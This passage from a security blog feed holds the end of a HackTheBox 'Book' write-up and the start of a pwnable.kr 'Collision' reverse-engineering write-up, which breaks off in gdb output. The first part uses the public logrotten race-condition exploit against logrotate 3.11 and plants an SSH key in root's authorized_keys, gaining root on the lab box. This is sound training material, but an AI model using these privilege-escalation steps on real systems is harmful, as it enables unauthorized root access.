class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">reader@book:/tmp/.hg8$ ./pspy64</span><br><span class="line">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒</span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░</span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░</span><br><span class="line">                   ░           ░ ░</span><br><span class="line">                               ░ ░</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">2020/05/02 14:57:34 CMD: UID=0    PID=63306  | /bin/sh /root/log.sh</span><br><span class="line">2020/05/02 14:57:34 CMD: UID=0    PID=63308  | sleep 5</span><br><span class="line">2020/05/02 14:57:44 CMD: UID=0    PID=63313  | /usr/sbin/logrotate -f /root/log.cfg</span><br></pre></td></tr></table></figure><p>We have a <code>logrotate</code> process running as root. Having never used it before let’s check it’s manual:</p><blockquote><p>Logrotate  is designed to ease administration of systems that generate large numbers of log  files.  It allows automatic rotation, compression, removal, and mailing of log files.  Each  log file may be handled daily, weekly, monthly, or when it grows too large.</p></blockquote><p>Let’s find out the arguments used in the command <code>/usr/sbin/logrotate -f /root/log.cfg</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reader@book:/$ man logrotate | grep -A 5 <span class="string">&quot;\-f&quot;</span></span><br><span class="line">-f, --force</span><br><span class="line">    Tells  logrotate  to force the rotation, even <span class="keyword">if</span> it doesn<span class="string">&#x27;t think this is </span></span><br><span class="line"><span class="string">    necessary.</span></span><br><span class="line"><span class="string">    Sometimes this is useful after adding new entries to a logrotate config file, </span></span><br><span class="line"><span class="string">    or  if old log files have been removed by hand, as the new files will be created, </span></span><br><span class="line"><span class="string">    and logging will continue correctly.</span></span><br></pre></td></tr></table></figure><p>While the <code>/root/log.cfg</code> probably contains the configuration to copy <code>access.log</code> files to <code>reader</code> home directory. </p><p>After looking at the documentation for a while it didn’t seem this process can be abused to achieve privilege escalation on the box. </p><p>Since the process is running as root maybe we can check if the version running have any public vulnerability allowing us to privilege escalation. The version on the box is <code>3.11</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reader@book:/$ logrotate --version</span><br><span class="line">logrotate 3.11.0</span><br></pre></td></tr></table></figure><p>A quick Google search yield an interesting result:</p><blockquote><p><strong>Exploit Title: logrotten 3.15.1 - Privilege Escalation</strong></p><p>logrotate is prone to a race condition after renaming the logfile.</p><p>If <code>logrotate</code> is executed as root, with option that creates a<br>file ( like create, copy, compress, etc.) and the user is in control<br>of the logfile path, it is possible to abuse a race-condition to write<br>files in ANY directories.</p><p>An attacker could elevate his privileges by writing reverse-shells into<br>directories like “/etc/bash_completition.d/“.</p><p><a href="https://github.com/whotwagner/logrotten">Logrotten</a></p></blockquote><p>Looks exactly what we need right ? Since the <code>/home/reader/backups</code> directory is under our control it seems like we have all the elements to successfully use this exploit. </p><h3 id="Logrotate-exploit"><a href="#Logrotate-exploit" class="headerlink" title="Logrotate exploit"></a>Logrotate exploit</h3><p>Let’s follow the <a href="https://github.com/whotwagner/logrotten/blob/master/logrotten.c">exploit page</a> to setup everything properly.</p><ol><li>Let’s compile the exploit file. After reviewing the code it seems like no changes are required in order to work properly on our box:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reader@book:/tmp/.hg8$ vi logrotten.c</span><br><span class="line">reader@book:/tmp/.hg8$ gcc -o logrotten logrotten.c</span><br><span class="line">reader@book:/tmp/.hg8$ ls</span><br><span class="line">logrotten  logrotten.c </span><br></pre></td></tr></table></figure><ol start="2"><li>Then let’s create our payload. The payload I will use consist in adding my SSH public key in the <code>authorized_keys</code> of <code>root</code> account:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reader@book:/tmp/.hg8$ cat payload</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">/bin/<span class="built_in">echo</span> <span class="string">&quot;ssh-rsa Axxxxx hg8@htb.htb&quot;</span> &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><ol start="3"><li>Next step is to run the exploit with our payload and the log file to watch for:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reader@book:/tmp/.hg8$ ./logrotten -p /tmp/.hg8/payload /home/reader/backups/access.log</span><br><span class="line">Waiting <span class="keyword">for</span> rotating /home/reader/backups/access.log...</span><br><span class="line">Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d</span><br><span class="line">Waiting 1 seconds before writing payload...</span><br></pre></td></tr></table></figure><p>Let’s append content to our log file to trigger the log rotation:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reader@book:/$ <span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt; backup/access.log</span><br></pre></td></tr></table></figure><p>Our payload should now have been written to <code>/etc/bash_completion.d</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reader@book:~$ cat /etc/bash_completion.d/access.log</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">/bin/<span class="built_in">echo</span> <span class="string">&quot;ssh-rsa Axxxxx hg8@htb.htb&quot;</span> &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>After waiting a little we should be able to be able to connect to the <code>root</code> account trough SSH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$  ssh -i id_rsa_htb root@book.htb</span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Sun Apr  5 11:03:02 2020 from ::1</span><br><span class="line">root@book:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@book:~<span class="comment"># cat root.txt</span></span><br><span class="line">8xxxxxxxxxxxxxxxxxxxxxx4</span><br></pre></td></tr></table></figure><hr><p>As always do not hesitate to contact me for any questions or feedbacks.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> book </tag>
            
            <tag> truncation </tag>
            
            <tag> XXS </tag>
            
            <tag> LFI </tag>
            
            <tag> PDF </tag>
            
            <tag> logrotate </tag>
            
            <tag> logrotten </tag>
            
            <tag> CVE-2019-1014 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.kr - Collision</title>
      <link href="/posts/pwnable/collision/"/>
      <url>/posts/pwnable/collision/</url>
      
        <content type="html"><![CDATA[<p><img src="https://user-images.githubusercontent.com/9076747/86539110-6f804480-befa-11ea-8939-900e8e97bbad.png" alt="collision"></p><p>One of my objective in 2020 is to level up in Reverse Engineering. Since I am starting from zero I got few people recommend <a href="http://pwnable.kr/">http://pwnable.kr</a> which appear to have a reasonable curve of difficulty making it ideal for learning. </p><p>If you have other recommandations for good ressources to learn and practices Reverse Engineering feels free to let me know below in a comment or <a href="https://hg8.sh/about/">contact me</a> ;)</p><p>That being said, here is my write-up for the second challenge of pwnable.kr: Collision. </p><p>Let’s go!</p><hr><h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><blockquote><p><strong>Collision</strong></p><p>Daddy told me about cool MD5 hash collision today.<br>I wanna do something like that too!</p><p>ssh <a href="mailto:&#99;&#x6f;&#x6c;&#64;&#112;&#119;&#110;&#x61;&#x62;&#108;&#101;&#x2e;&#107;&#114;">&#99;&#x6f;&#x6c;&#64;&#112;&#119;&#110;&#x61;&#x62;&#108;&#101;&#x2e;&#107;&#114;</a> -p2222 (pw:guest)</p></blockquote><p>This gives us an SSH access to a box with a hint that this challenge seems to be about MD5 Collision.</p><h2 id="Hash-Collision"><a href="#Hash-Collision" class="headerlink" title="Hash Collision"></a>Hash Collision</h2><p>In order to get the right context, here is a definition of Hash Collision:</p><blockquote><p>A Hash Collision Attack is an attempt to find two input strings of a  hash function that produce the same hash result. Because hash functions  have infinite input length and a predefined output length, there is  inevitably going to be the possibility of two different inputs that  produce the same output hash. If two separate inputs produce the same  hash output, it is called a collision. This collision can then be  exploited by any application that compares two hashes together – such as password hashes, file integrity checks, etc.</p><p><a href="https://privacycanada.net/hash-functions/hash-collision-attack/">https://privacycanada.net/hash-functions/hash-collision-attack/</a></p></blockquote><h2 id="Test-amp-Analysis"><a href="#Test-amp-Analysis" class="headerlink" title="Test &amp; Analysis"></a>Test &amp; Analysis</h2><p>Once connected on the box we find both a <code>col</code> bin and its source code:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh col@pwnable.kr -p2222</span><br><span class="line">col@pwnable.kr<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string"> ____  __    __  ____    ____  ____   _        ___      __  _  ____</span></span><br><span class="line"><span class="string">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \</span></span><br><span class="line"><span class="string">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &#x27;</span> / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /</span><br><span class="line">|  |  |  `  <span class="string">&#x27;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \</span></span><br><span class="line"><span class="string">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span></span><br><span class="line"><span class="string">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sun Jul  5 13:05:36 2020 from 10.10.10.10</span></span><br><span class="line"><span class="string">col@pwnable:~$ ls -l</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">-r-sr-x--- 1 col_pwn col     7341 Jun 11  2014 col</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root    root     555 Jun 12  2014 col.c</span></span><br><span class="line"><span class="string">-r--r----- 1 col_pwn col_pwn   52 Jun 11  2014 flag</span></span><br><span class="line"><span class="string">col@pwnable:~$</span></span><br></pre></td></tr></table></figure><p>Let’s pull everything to work on it locally:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp -P2222 col@pwnable.kr:col.c .</span><br></pre></td></tr></table></figure><p>The programs takes a 20 bytes long passcode and do some kind of check on it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ./col A</span><br><span class="line">passcode length should be 20 bytes</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ ./col AAAAAAAAAAAAAAAAAAAA</span><br><span class="line">wrong passcode.</span><br></pre></td></tr></table></figure><h3 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h3><p>I always like to start off with Dynamic Analysis in order to get a quick understanding of what the program is doing “behind the hood”. </p><p>To do so I will use GDB with the <a href="https://github.com/hugsy/gef">excellent GEF plugin</a> to help in the task.</p><p>First let’s open the executable, set a break point to <code>main</code> function, give a 20 char string as argument  and see what’s going on:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gdb col</span><br><span class="line">GNU gdb (GDB) 9.2</span><br><span class="line">  </span><br><span class="line">gef➤  <span class="built_in">break</span> main</span><br><span class="line">Breakpoint 1 at 0x11b7</span><br><span class="line">gef➤   r <span class="string">&quot;AAAAAAAAAAAAAAAAAAAA&quot;</span></span><br></pre></td></tr></table></figure><p>The program immediately break and we get a bunch of informations:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x00005555555551b7</span> <span class="function">in <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">[ Legend: Modified <span class="keyword">register</span> | Code | Heap | Stack | String ]</span></span><br><span class="line"><span class="function">──────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span></span><br><span class="line"><span class="function">$rax   : 0x00005555555551b3  →  &lt;main+0&gt; push rbp</span></span><br><span class="line"><span class="function">$rbx   : 0x0</span></span><br><span class="line"><span class="function">$rcx   : 0x00007ffff7fae578  →  0x00007ffff7fb0960  →  0x0000000000000000</span></span><br><span class="line"><span class="function">$rdx   : 0x00007fffffffe1b0  →  0x00007fffffffe496  →  &quot;USER</span>=hg8<span class="string">&quot;</span></span><br><span class="line"><span class="string">$rsp   : 0x00007fffffffe0a0  →  0x0000555555555260  →  &lt;__libc_csu_init+0&gt; endbr64</span></span><br><span class="line"><span class="string">$rbp   : 0x00007fffffffe0a0  →  0x0000555555555260  →  &lt;__libc_csu_init+0&gt; endbr64</span></span><br><span class="line"><span class="string">$rsi   : 0x00007fffffffe198  →  0x00007fffffffe45d  →  &quot;</span>/home/hg8/pwnable.kr/collision/col<span class="string">&quot;</span></span><br><span class="line"><span class="string">$rdi   : 0x2</span></span><br><span class="line"><span class="string">$rip   : 0x00005555555551b7  →  &lt;main+4&gt; sub rsp, 0x10</span></span><br><span class="line"><span class="string">$r8    : 0x0</span></span><br><span class="line"><span class="string">$r9    : 0x00007ffff7fe22c0  →  &lt;_dl_fini+0&gt; endbr64</span></span><br><span class="line"><span class="string">$r10   : 0x0</span></span><br><span class="line"><span class="string">$r11   : 0x0</span></span><br><span class="line"><span class="string">$r12   : 0x0000555555555070  →  &lt;_start+0&gt; endbr64</span></span><br><span class="line"><span class="string">$r13   : 0x0</span></span><br><span class="line"><span class="string">$r14   : 0x0</span></span><br><span class="line"><span class="string">$r15   : 0x0</span></span><br><span class="line"><span class="string">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="string">$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000</span></span><br><span class="line"><span class="string">──────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span></span><br><span class="line"><span class="string">0x00007fffffffe0a0│+0x0000: 0x0000555555555260  →  &lt;__libc_csu_init+0&gt; endbr64   ← $rsp, $rbp</span></span><br><span class="line"><span class="string">0x00007fffffffe0a8│+0x0008: 0x00007ffff7e15002  →  &lt;__libc_start_main+242&gt; mov edi, eax</span></span><br><span class="line"><span class="string">0x00007fffffffe0b0│+0x0010: 0x00007fffffffe198  →  0x00007fffffffe45d  →  &quot;</span>/home/hg8/pwnable.kr/collision/col<span class="string">&quot;</span></span><br><span class="line"><span class="string">0x00007fffffffe0b8│+0x0018: 0x0000000200000000</span></span><br><span class="line"><span class="string">0x00007fffffffe0c0│+0x0020: 0x00005555555551b3  →  &lt;main+0&gt; push rbp</span></span><br><span class="line"><span class="string">0x00007fffffffe0c8│+0x0028: 0x00007ffff7e14afd  →  &lt;init_cacheinfo+301&gt; mov rbp, rax</span></span><br><span class="line"><span class="string">0x00007fffffffe0d0│+0x0030: 0x0000000000000000</span></span><br><span class="line"><span class="string">0x00007fffffffe0d8│+0x0038: 0xa7393fcc1a757ccd</span></span><br><span class="line"><span class="string">────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span></span><br><span class="line"><span class="string">   0x5555555551b2 &lt;check_password+73&gt; ret</span></span><br><span class="line"><span class="string">   0x5555555551b3 &lt;main+0&gt;         push   rbp</span></span><br><span class="line"><span class="string">   0x5555555551b4 &lt;main+1&gt;         mov    rbp, rsp</span></span><br><span class="line"><span class="string"> → 0x5555555551b7 &lt;main+4&gt;         sub    rsp, 0x10</span></span><br><span class="line"><span class="string">   0x5555555551bb &lt;main+8&gt;         mov    DWORD PTR [rbp-0x4], edi</span></span><br><span class="line"><span class="string">   0x5555555551be &lt;main+11&gt;        mov    QWORD PTR [rbp-0x10], rsi</span></span><br><span class="line"><span class="string">   0x5555555551c2 &lt;main+15&gt;        cmp    DWORD PTR [rbp-0x4], 0x1</span></span><br><span class="line"><span class="string">   0x5555555551c6 &lt;main+19&gt;        jg     0x5555555551ea &lt;main+55&gt;</span></span><br><span class="line"><span class="string">   0x5555555551c8 &lt;main+21&gt;        mov    rax, QWORD PTR [rbp-0x10]</span></span><br><span class="line"><span class="string">────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span></span><br><span class="line"><span class="string">[#0] Id 1, Name: &quot;</span>col<span class="string">&quot;, stopped 0x5555555551b7 in main (), reason: BREAKPOINT</span></span><br><span class="line"><span class="string">──────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span></span><br><span class="line"><span class="string">[#0] 0x5555555551b7 → main()</span></span><br><span class="line"><span class="string">───────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></span><br></pre></td></tr></table></figure><p>We notice a function called <code>check_password</code>, that’s very probably where the magic happen. Let’s use <code>ni</code> to jump a bunch of time until we arrive to the said function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">gef➤  ni</span><br><span class="line"><span class="number">0x0000555555555224</span> <span class="function">in <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">[ Legend: Modified <span class="keyword">register</span> | Code | Heap | Stack | String ]</span></span><br><span class="line"><span class="function">──────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span></span><br><span class="line"><span class="function">$rax   : 0x00007fffffffe481  →  &quot;AAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line"><span class="function">$rbx   : 0x0</span></span><br><span class="line"><span class="function">$rcx   : 0x1</span></span><br><span class="line"><span class="function">$rdx   : 0x00007fffffffe481  →  &quot;AAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line"><span class="function">$rsp   : 0x00007fffffffe090  →  0x00007fffffffe198  →  0x00007fffffffe45d  →  &quot;/home/hugo/pwnable.kr/collision/col&quot;</span></span><br><span class="line"><span class="function">$rbp   : 0x00007fffffffe0a0  →  0x0000555555555260  →  &lt;__libc_csu_init+0&gt; endbr64</span></span><br><span class="line"><span class="function">$rsi   : 0x00007fffffffe198  →  0x00007fffffffe45d  →  &quot;/home/hg8/pwnable.kr/collision/col&quot;</span></span><br><span class="line"><span class="function">$rdi   : 0x00007fffffffe481  →  &quot;AAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line"><span class="function">$rip   : 0x0000555555555224  →  &lt;main+113&gt; call 0x555555555169 &lt;check_password&gt;</span></span><br><span class="line"><span class="function">$r8    : 0x0</span></span><br><span class="line"><span class="function">$r9    : 0x00007ffff7fe22c0  →  &lt;_dl_fini+0&gt; endbr64</span></span><br><span class="line"><span class="function">$r10   : 0x000055555555442f  →  0<span class="title">x73006e656c727473</span> <span class="params">(<span class="string">&quot;strlen&quot;</span>?)</span></span></span><br><span class="line"><span class="function">$r11   : 0x00007ffff7f504a0  →  &lt;__strlen_avx2+0&gt; endbr64</span></span><br><span class="line"><span class="function">$r12   : 0x0000555555555070  →  &lt;_start+0&gt; endbr64</span></span><br><span class="line"><span class="function">$r13   : 0x0</span></span><br><span class="line"><span class="function">$r14   : 0x0</span></span><br><span class="line"><span class="function">$r15   : 0x0</span></span><br><span class="line"><span class="function">$eflags: [zero carry PARITY ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="function">$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000</span></span><br><span class="line"><span class="function">──────────────────────────────────────────────────────────────────────────────────────────────────── <span class="built_in">stack</span> ────</span></span><br><span class="line"><span class="function">0x00007fffffffe090│+0x0000: 0x00007fffffffe198  →  0x00007fffffffe45d  →  &quot;/home/hugo/pwnable.kr/collision/col&quot; ← $rsp</span></span><br><span class="line"><span class="function">0x00007fffffffe098│+0x0008: 0x0000000200000000</span></span><br><span class="line"><span class="function">0x00007fffffffe0a0│+0x0010: 0x0000555555555260  →  &lt;__libc_csu_init+0&gt; endbr64   ← $rbp</span></span><br><span class="line"><span class="function">0x00007fffffffe0a8│+0x0018: 0x00007ffff7e15002  →  &lt;__libc_start_main+242&gt; mov edi, eax</span></span><br><span class="line"><span class="function">0x00007fffffffe0b0│+0x0020: 0x00007fffffffe198  →  0x00007fffffffe45d  →  &quot;/home/hugo/pwnable.kr/collision/col&quot;</span></span><br><span class="line"><span class="function">0x00007fffffffe0b8│+0x0028: 0x0000000200000000</span></span><br><span class="line"><span class="function">0x00007fffffffe0c0│+0x0030: 0x00005555555551b3  →  &lt;main+0&gt; push rbp</span></span><br><span class="line"><span class="function">0x00007fffffffe0c8│+0x0038: 0x00007ffff7e14afd  →  &lt;init_cacheinfo+301&gt; mov rbp, rax</span></span><br><span class="line"><span class="function">────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span></span><br><span class="line"><span class="function">   0x555555555219 &lt;main+102&gt;       lock   add rax, 0x8</span></span><br><span class="line"><span class="function">   0x55555555521e &lt;main+107&gt;       mov    rax, QWORD PTR [rax]</span></span><br><span class="line"><span class="function">   0x555555555221 &lt;main+110&gt;       mov    rdi, rax</span></span><br><span class="line"><span class="function"> → 0x555555555224 &lt;main+113&gt;       call   0x555555555169 &lt;check_password&gt;</span></span><br><span class="line"><span class="function">   ↳  0x555555555169 &lt;check_password+0&gt; push   rbp</span></span><br><span class="line"><span class="function">      0x55555555516a &lt;check_password+1&gt; mov    rbp, rsp</span></span><br><span class="line"><span class="function">      0x55555555516d &lt;check_password+4&gt; mov    QWORD PTR [rbp-0x18], rdi</span></span><br><span class="line"><span class="function">      0x555555555171 &lt;check_password+8&gt; mov    rax, QWORD PTR [rbp-0x18]</span></span><br><span class="line"><span class="function">      0x555555555175 &lt;check_password+12&gt; mov    QWORD PTR [rbp-0x8], rax</span></span><br><span class="line"><span class="function">      0x555555555179 &lt;check_password+16&gt; mov    DWORD PTR [rbp-0xc], 0x0</span></span><br><span class="line"><span class="function">────────────────────────────────────────────────────────────────────────────────────── <span class="title">arguments</span> <span class="params">(guessed)</span> ────</span></span><br><span class="line"><span class="function"><span class="title">check_password</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   $rdi = <span class="number">0x00007fffffffe481</span> → <span class="string">&quot;AAAAAAAAAAAAAAAAAAAA&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">   $rsi = <span class="number">0x00007fffffffe198</span> → <span class="number">0x00007fffffffe45d</span> → <span class="string">&quot;/home/hg8/pwnable.kr/collision/col&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">   $rdx = <span class="number">0x00007fffffffe481</span> → <span class="string">&quot;AAAAAAAAAAAAAAAAAAAA&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function">────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span></span><br><span class="line"><span class="function">[#0] Id 1, Name: &quot;col&quot;, stopped 0x555555555224 in <span class="title">main</span> <span class="params">()</span>, reason: SINGLE STEP</span></span><br><span class="line"><span class="function">──────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span></span><br><span class="line"><span class="function">[#0] 0x555555555224 → <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">──────────────────</span></span><br></pre></td></tr></table></figure><p>We can see that our password got set in <code>$rdi</code> and <code>$rdx</code> registers. At this point I put up a breakpoint on <code>check_password</code> function but doesn’t quite understood what exactly was going on (except some loop and calculations).<br>Let’s continue to see what happen in <code>main</code> once <code>check_password</code> return something:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000555555555229</span> <span class="function">in <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">[ Legend: Modified <span class="keyword">register</span> | Code | Heap | Stack | String ]</span></span><br><span class="line"><span class="function">──────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span></span><br><span class="line"><span class="function">$rax   : 